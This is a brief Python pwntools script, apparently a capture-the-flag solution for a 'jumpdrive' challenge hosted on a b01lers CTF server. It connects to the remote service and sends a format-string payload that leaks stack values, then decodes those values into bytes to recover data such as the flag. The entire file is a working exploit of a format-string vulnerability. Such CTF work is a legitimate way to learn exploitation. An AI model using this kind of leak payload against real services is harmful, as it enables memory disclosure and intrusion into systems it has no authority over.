#!/usr/bin/python
from pwn import *
context.log_level = 'debug'
#r = process('./jumpdrive')
r = remote('pwn.ctf.b01lers.com', 1002)
r.sendlineafter('Where are we going?\n', '%10$p %11$p %12$p %13$p')
print ''.join([p64(int(h,16)) for h in r.recvline()[:-1].split()])
